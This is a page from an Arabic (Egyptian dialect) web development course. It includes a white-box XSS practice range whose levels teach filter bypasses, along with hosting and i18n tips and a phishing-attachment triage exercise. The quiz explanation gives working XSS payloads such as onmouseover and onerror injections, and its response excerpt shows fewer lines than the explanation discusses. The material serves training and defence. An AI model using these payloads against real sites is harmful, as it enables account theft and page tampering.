ابني الـ payload الأقل

اخرج من الـ context بأقل حروف، وبعدين اختار طريقة تنفيذ: event handler بيشتغل لوحده، أو javascript: URL، أو script.

06

لو فيه فلتر: افهمه ومتخمّنش

جرّب حرف حرف وكلمة كلمة: إيه اللي بيتمسك؟ وبعدين استخدم قواعد الـ parser (الدرس 13) والـ encoding (الدرس 14) عشان تعدّي.

🏴 XSS Range

كل مستوى «سيرفر» صغير كوده مكشوف قدامك (white-box). الـ payload بتاعك بيتحط مكان input، والصفحة الناتجة بتتعرض في sandboxed iframe (من غير network). الهدف: تشغّل alert() (أو confirm/prompt/print). اقرا الكود، شوف الـ response، وفكّر في الـ context قبل ما تجرّب.

LEVEL 1

Hello, reflection

صفحة بحث بتعرض كلمة البحث زي ما هي. ابدأ بالكلاسيكي.

LEVEL 2

No scripts allowed

المطوّر «صلّح» المشكلة بإنه يمسح أي tag script.

LEVEL 3

Inside a quoted attribute

اسم الصورة بتاعتك بيتحط جوه src. الـ < و> بيتعملهم encode.

LEVEL 4

Unquoted attribute

المرة دي كل الـ quotes والأقواس الزاوية متعمّلها encode. بس بص كويس على الـ attribute.

LEVEL 5

Inside a JavaScript string

كلمة البحث بتتحط جوه string في script. السيرفر بيعمل escape للـ ' وencode للـ < >.

LEVEL 6

javascript: is blocked

«الويبسايت الشخصي» بيتحط في href. أي قيمة فيها javascript: بتتمسح. (المستوى ده محتاج تدوس على اللينك في المعاينة.)

LEVEL 7

Trapped in a textarea

الـ bio بتاعك بيرجع جوه textarea عشان تعدّله. الـ script tags بتتمسح.

LEVEL 8

No event handlers… right?

الفلتر بيمسح الـ scripts، وأي on…= قبله مسافة بيتحول لـ data-x=.

LEVEL 9

No parentheses

الفلتر بيمسح أي ( أو ) — وكمان الـ script tags.

LEVEL 10

Delete the bad words

الفلتر بيمسح كلمة script وكلمات onerror/onload من أي حتة (case-insensitive).

LEVEL 11

DOM sink

السيرفر المرة دي آمن: بيحط الاسم في JSON بـ escaping صح. بس كود الصفحة نفسه بيعمل حاجة بالاسم ده…

LEVEL 12

Hidden in a comment

آخر بحث بيتسجّل في HTML comment للـ debugging. الفلتر بيمسح -->.

LEVEL 13

The WAF

WAF بيرفض أي request فيه tags من القايمة دي: script img svg iframe object embed body style link meta a math. الـ event handlers مسموحة.

فين الـ context الضعيف؟

بعت canary zq9'"<> في parameter اسمه ref، ولقيته في 4 أماكن في الـ response. رقم السطر (1–4) اللي تقدر تخرج منه من الـ context بتاعه؟

response.html (excerpt)

<input type="hidden" name="ref" value="zq9'&quot;&lt;&gt;">
<script>var ref = "zq9'\"<>";</script>
<a href='/back?ref=zq9'"<>'>Back</a>
💡 تلميح
في كل سطر: أنهي حرف بيقفل الـ context ده، وهل رجع خام ولا متعمّله encode/escape؟
📖 الشرح: السطر 4. (1) جوه title (RCDATA) والـ < متعمّلها encode → مفيش </title>. (2) الـ attribute محوط بـ " والـ " بقت &quot;. (3) JS string محوط بـ " والـ " متعمّلها \" والـ < بقت < → مفيش خروج من الـ string ولا </script>. (4) الـ href محوط بـ single quotes والـ ' رجعت خام → بتقفل الـ attribute: ref=x' onmouseover='alert(1) أو '><img src=x onerror=alert(1)> (لأن <> خام كمان). نفس الـ canary، 4 contexts، 4 نتايج مختلفة.

النشر على الإنترنت

01

Static hosting مجاني

GitHub Pages، Netlify، Cloudflare Pages: ارفع الفولدر (أو اربط الـ repo) والموقع يبقى على HTTPS في دقيقة. الكورس ده نفسه static وبيتنشر بنفس الطريقة.

02

Domain

اشتري دومين واربطه بـ DNS record (CNAME/A) — والـ HTTPS بيتعمل أوتوماتيك (Let's Encrypt).

03

Cache busting

المتصفح بيخزّن الـ CSS والـ JS. لما تحدّثهم، غيّر اسمهم أو ضيف version: style.css?v=2 أو style.4f9c2a.css (أدوات الـ build بتعمل ده).

04

Headers الأمان

Netlify وCloudflare بيسمحوا بملف _headers تحط فيه CSP وX-Frame-Options… (GitHub Pages مبيسمحش بـ custom headers — اعرف حدود الـ hosting بتاعك).

Progressive enhancement

ابني الصفحة طبقات: HTML لوحده لازم يشتغل (اللينكات بتفتح، الفورم بتتبعت)، بعدين CSS للشكل، بعدين JavaScript لتحسين التجربة (validation فوري، إرسال من غير reload). لو الـ JS فشل (شبكة بطيئة، extension، error) الموقع لسه شغّال. وقبل ما تستخدم feature جديدة: caniuse.com أو علامة Baseline في MDN.

مواقع عربي: الـ i18n صح

  • <html lang="ar" dir="rtl"> — والـ CSS logical properties (margin-inline-start) في الجزء التاني بتخلي نفس الـ CSS يشتغل للاتجاهين.
  • أي محتوى من المستخدم (تعليق، اسم) اتجاهه مجهول: dir="auto" على العنصر أو <bdi> حواليه، وكمان على خانات الإدخال.

🦠 Triage لمرفق Phishing بصيغة HTML

متقدم▼

مرفق اسمه Shared_Document.html وصل لموظف. شغلك: تحليل static الأول، بعدين «تفجير» آمن في sandbox التحليل (مفيش network، وكل sink بيتسجّل)، وفي الآخر قايمة IOCs. الدروس: 06، 10، 14، 15. (العينة دي تعليمية ومن تأليفنا، والدومينات من نطاق التوثيق .example.)

  1. Static: اقرا الملف كنص. علّم كل حاجة مشبوهة: refresh، data URI، hidden inputs، strings متقسّمة، atob/unescape/document.write.
  2. Decode: فك الطبقات بالـ Encoder (الدرس 14) من غير تشغيل.
  3. Detonate: دوس «🧪 شغّل في sandbox التحليل» وقارن الـ sinks باللي فكّيته بإيدك.
  4. IOCs: جدول بالـ domains/URLs، الـ victim identifiers، الـ lure text، والتقنيات (techniques).
